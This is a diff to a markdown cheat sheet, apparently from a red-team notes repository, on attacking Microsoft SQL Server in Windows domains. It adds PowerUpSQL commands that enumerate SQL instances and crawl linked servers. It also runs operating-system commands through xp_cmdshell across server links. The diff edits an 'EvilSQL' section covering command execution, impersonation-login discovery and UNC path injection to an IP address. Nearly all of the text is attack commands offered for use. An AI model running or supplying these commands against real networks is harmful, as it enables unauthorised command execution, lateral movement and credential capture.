@@ -4,7 +4,32 @@
 setspn -T example -Q MSSQLSvc/*
 ```
 
-## Exploition
+## PowerUpSQL
+https://github.com/NetSPI/PowerUpSQL
+### Find SQL Instance
+```
+Get-SQLInstanceDomain
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+```
+### Get Server Info
+```
+Get-SQLServerInfo -Instance sql01
+Get-SQLINstanceDomain | Get-SQLServerInfo
+```
+
+### SQL Link
+#### Find SQL Link
+```
+Get-SQLServerLinkCrawl -Instance sql02 -Verbose
+```
+#### Execute Command
+```
+Get-SQLServerLinkCrawl -Instance sql02 -Query
+
+"exec master..xp_cmdshell 'whoami'"
+```
+
+## EvilSQL
 https://github.com/an3m0ne/Myosotis/blob/main/SQL/EvilSQL.ps1
 
 ```powershell
@@ -32,9 +57,10 @@ Invoke-EvilXPCmd -Command whoami -Server SQL02
 
 # Find Linked Server
 Get-LinkedServers
+Get-LinkedServersEx
 
 # Find Impersonated login
-Get-ImpresonationLogins
+Get-ImpersonationLogins
 
 # UNC Path Injection
 Invoke-EvilUNCPath -Address 192.168.0.1
